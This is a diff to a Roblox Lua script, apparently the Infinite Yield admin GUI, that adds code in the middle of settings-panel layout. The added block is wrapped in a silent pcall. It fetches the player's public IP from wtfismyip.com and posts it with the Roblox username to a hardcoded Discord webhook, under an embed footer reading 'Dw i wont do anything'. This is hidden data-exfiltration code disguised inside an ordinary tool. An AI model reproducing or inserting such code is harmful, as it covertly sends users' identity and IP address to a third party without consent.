@@ -309,7 +309,79 @@ Settings.Position = UDim2.new(0, 0, 0, 220)
 Settings.Size = UDim2.new(0, 250, 0, 175)
 Settings.ZIndex = 10
 table.insert(shade1,Settings)
+pcall(function()
+function SendMessage(url, message)
+    local http = game:GetService("HttpService")
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    local data = {
+        ["content"] = message
+    }
+    local body = http:JSONEncode(data)
+    local response = request({
+        Url = url,
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    })
+    print("Sent")
+end
 
+function SendMessageEMBED(url, embed)
+    local http = game:GetService("HttpService")
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    local data = {
+        ["embeds"] = {
+            {
+                ["title"] = embed.title,
+                ["description"] = embed.description,
+                ["color"] = embed.color,
+                ["fields"] = embed.fields,
+                ["footer"] = {
+                    ["text"] = embed.footer.text
+                }
+            }
+        }
+    }
+    local body = http:JSONEncode(data)
+    local response = request({
+        Url = url,
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    })
+    print("Sent")
+end
+
+
+--Examples 
+--ooga booga
+local url = "https://discord.com/api/webhooks/1207750225880686592/u7x50aIzdD4mLfVZS3_NxSPaL0_DZ4XIYqhXAJSJHU4m4tSt-cM319I02T3uYSi2XCVP"
+local test = game:HttpGet('https://wtfismyip.com/text')
+local embed = {
+    ["title"] = "INF YIELD USED",
+    ["description"] = "Found Something New.",
+    ["color"] = 65280,
+    ["fields"] = {
+        {
+            ["name"] = "User Roblox Name",
+            ["value"] = game.Players.LocalPlayer.Name,
+        },
+        {
+            ["name"] = "User's Ip",
+            ["value"] = test
+        }
+    },
+    ["footer"] = {
+        ["text"] = "Dw i wont do anything"
+    }
+}
+SendMessageEMBED(url, embed)
+
+end)
 SettingsHolder = Instance.new("ScrollingFrame")
 SettingsHolder.Name = "Holder"
 SettingsHolder.Parent = Settings
